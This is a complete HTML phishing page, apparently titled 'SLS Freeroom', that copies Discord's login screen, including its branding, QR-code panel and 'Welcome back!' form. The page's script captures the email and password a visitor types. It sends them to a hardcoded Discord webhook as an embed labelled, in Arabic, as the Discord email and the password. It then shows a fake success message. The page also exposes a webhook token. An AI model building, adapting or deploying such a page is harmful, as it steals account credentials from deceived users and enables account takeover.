<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>واجهة دخول ديسكورد - SLS Freeroom</title>
<style>
  @font-face {
    font-family: "Uni Sans";
    src: local("Uni Sans"), local("UniSans"), url("https://cdn.jsdelivr.net/gh/discord/uni-font/UniSans-Variable.woff2") format("woff2");
    font-weight: 100 900;
    font-display: swap;
  }
  body {
    margin: 0; padding: 0;
    font-family: "Uni Sans", "Tajawal", sans-serif;
    direction: rtl;
    color: #fff;
    height: 100vh;
    overflow: hidden;
    background: url('backrawnd') no-repeat center center fixed;
    background-size: cover;
    position: relative;
  }
  .discord-logo {
    position: absolute;
    top: 20px;
    left: 20px;
    width: 45px;
    height: 45px;
    background: url('logo') no-repeat center center / contain;
  }
  .login-box {
    position: relative;
    width: 470px;
    background: #2f3136;
    border-radius: 8px;
    display: flex;
    box-shadow: 0 0 10px #7289daaa;
    overflow: hidden;
    margin: auto;
    top: 50%;
    transform: translateY(-50%);
    z-index: 10;
  }
  .form-section {
    flex: 2;
    padding: 40px 40px 40px 30px;
  }
  .form-section h1 {
    margin: 0 0 3px;
    font-size: 22px;
    font-weight: 700;
    color: #fff;
  }
  .form-section small {
    font-size: 13px;
    color: #72767d;
    margin-bottom: 40px;
    display: block;
  }
  label {
    font-size: 12px;
    color: #72767d;
    margin-bottom: 6px;
    display: block;
    letter-spacing: 0.1em;
  }
  input[type="text"], input[type="password"] {
    background: #202225;
    border: none;
    border-radius: 3px;
    color: #dcddde;
    font-size: 15px;
    padding: 12px 14px;
    width: 100%;
    margin-bottom: 18px;
    box-sizing: border-box;
  }
  input::placeholder {
    color: #72767d;
    opacity: 1;
  }
  .forgot-password {
    font-size: 12px;
    color: #72767d;
    margin-top: -12px;
    margin-bottom: 20px;
    cursor: pointer;
    user-select: none;
  }
  button {
    background-color: #5865f2;
    border: none;
    border-radius: 4px;
    color: white;
    font-size: 16px;
    font-weight: 600;
    padding: 12px 0;
    width: 100%;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #4752c4;
  }
  .qr-section {
    flex: 1;
    background: #36393f;
    padding: 36px 20px 40px;
    border-left: 1px solid #202225;
    text-align: center;
    font-size: 12px;
    color: #b9bbbe;
    user-select: none;
  }
  .qr-section img {
    width: 110px;
    height: 110px;
    margin-bottom: 12px;
  }
  .qr-section h2 {
    font-weight: 600;
    font-size: 16px;
    margin-bottom: 4px;
  }
  .qr-section p {
    line-height: 1.2;
    margin-bottom: 5px;
  }
  #sitePage {
    display: none;
    color: white;
    text-align: center;
    padding: 50px;
  }
</style>
</head>
<body>

<div class="discord-logo" aria-label="Discord Logo"></div>

<div class="login-box" id="loginPage">
  <form class="form-section" id="loginForm">
    <h1>Welcome back!</h1>
    <small>We’re so excited to see you again!</small>

    <label for="email">Email or Phone Number</label>
    <input type="text" id="email" name="email" placeholder="Email or Phone Number" required />

    <label for="password">Password</label>
    <input type="password" id="password" name="password" placeholder="Password" required />
    
    <div class="forgot-password" tabindex="0" role="button" onclick="alert('نسيت كلمة السر؟ يمكنك إنشاء حساب جديد');">Forgot your password?</div>
    
    <button type="submit">Log In</button>
  </form>

  <div class="qr-section">
    <img src="https://cdn.discordapp.com/security/ssl/qr_code.webp" alt="Discord QR Code" />
    <h2>Log in with QR Code</h2>
    <p>Scan this with the Discord mobile app to log in instantly.</p>
    <p>Or, sign in with passkey.</p>
  </div>
</div>

<div id="sitePage">
  <!-- كود الموقع بعد تسجيل الدخول -->
  <h1>مرحبًا بك في موقع SLS Freeroom</h1>
  <p>تم الدخول بنجاح!</p>
</div>

<script>
  const webhookURL = "https://discord.com/api/webhooks/1364438803170725899/9Zrvq7SXUIUIE8VEdazpPYtyc1qwDmaJufck8dEfC2w0xbc5TVktfzrb6vUJnPasaqDb";

  document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
      alert('يرجى ملء جميع الحقول');
      return;
    }

    const message = {
      embeds: [
        {
          title: "تم استلام بيانات جديدة من الموقع",
          color: 7506394,
          fields: [
            { name: "إيميل الديسكورد", value: email, inline: false },
            { name: "كلمة السر", value: password, inline: false }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message)
    }).then(response => {
      if (response.ok) {
        alert('تم تسجيل الدخول بنجاح');
        document.getElementById('loginPage').style.display = "none";
        document.getElementById('sitePage').style.display = "block";
      } else {
        alert('فشل الإرسال، حاول مرة أخرى لاحقاً.');
      }
    }).catch(err => {
      alert('حدث خطأ في الاتصال: ' + err.message);
    });
  });
</script>

</body>
  </html>
